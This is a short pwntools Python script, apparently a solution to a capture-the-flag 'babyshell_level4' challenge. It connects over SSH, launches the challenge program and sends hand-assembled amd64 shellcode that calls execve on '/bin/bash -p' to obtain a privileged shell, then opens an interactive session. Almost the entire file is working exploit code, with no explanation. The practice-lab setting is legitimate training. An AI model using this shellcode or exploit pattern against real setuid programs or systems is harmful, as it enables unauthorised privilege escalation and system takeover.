#!/usr/bin/env python3
from pwn import *
import re

context.arch = 'amd64'


def btos(n):
    return n.decode('UTF-8')
    
s = ssh(host="pwn")
f = SSHPath('/tmp/my_script.py', ssh=s)
f.touch()
f.write_text('import subprocess; subprocess.run("/challenge/babyshell_level4")')
p = s.process(['python', '/tmp/my_script.py'])
r = p.recvuntil(b"Reading 0x1000 bytes from stdin.")
print(r.decode())

shellcode="""
push 0x68  # b'h'
push 0x6e69622f 
mov dword ptr [rsp+4], 0x7361622f  # b'/bin/bas'
push rsp
pop rdi
push 0x702d  # b'-p'
push rsp
pop rsi
push 0
push rsi
push rdi
push rsp
pop rsi
push 0
pop rdx
push 0x3b
pop rax
syscall
"""
#shellcode=pwnlib.shellcraft.i386.linux.sh()
shellcode=(asm(shellcode))


print('1', shellcode)


shellcode=bytes(shellcode)
p.send(shellcode)
p.interactive()